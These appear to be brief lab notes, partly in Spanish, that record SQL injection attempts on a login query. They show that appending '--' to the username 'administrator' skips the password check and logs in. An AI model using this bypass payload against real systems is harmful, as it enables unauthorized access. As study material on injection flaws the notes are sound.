SELECT fistname FROM users where Username = 'admin' and Password = 'algo'


SELECT fistname FROM users where Username = '' and Password = 'algo'
---> Resultado: Internal Server Error


SELECT fistname FROM users where Username = 'admin'--' and Password = 'algo'  
---> Resultado: Invalid username or password.

SELECT fistname FROM users where Username = 'administrator'--' and Password = 'algo'
---> Resultado: Your username is: administrator



